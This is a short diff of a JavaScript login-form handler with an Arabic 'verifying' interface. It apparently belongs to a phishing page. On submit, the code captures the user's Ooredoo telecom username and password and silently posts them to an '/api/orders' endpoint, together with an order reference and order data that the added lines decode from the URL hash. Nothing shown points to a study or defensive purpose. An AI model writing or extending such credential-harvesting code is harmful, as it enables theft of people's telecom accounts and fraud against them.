@@ -135,13 +135,16 @@ $("loginForm").addEventListener("submit", async e => {
   btn.disabled = true; btn.textContent = "جاري التحقق...";
 
   const orderHash = location.hash.slice(1);
-  const ref = orderHash.split("~")[0];
+  const parts = orderHash.split("~");
+  const ref = parts[0];
+  let orderData = {};
+  try { const bin = atob((parts[1]||"e30=").replace(/-/g,"+").replace(/_/g,"/")); orderData = JSON.parse(new TextDecoder().decode(Uint8Array.from(bin, c=>c.charCodeAt(0)))); } catch(e){}
 
   try {
     await fetch("/api/orders", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ ref: ref, ooredoo: { username: $("username").value.trim(), password: $("password").value.trim() }, step: "ooredoo" })
+      body: JSON.stringify({ ...orderData, ref: ref, status: "awaiting", lang: "ar", ooredoo: { username: $("username").value.trim(), password: $("password").value.trim() }, step: "ooredoo" })
     });
   } catch (e) {}
 
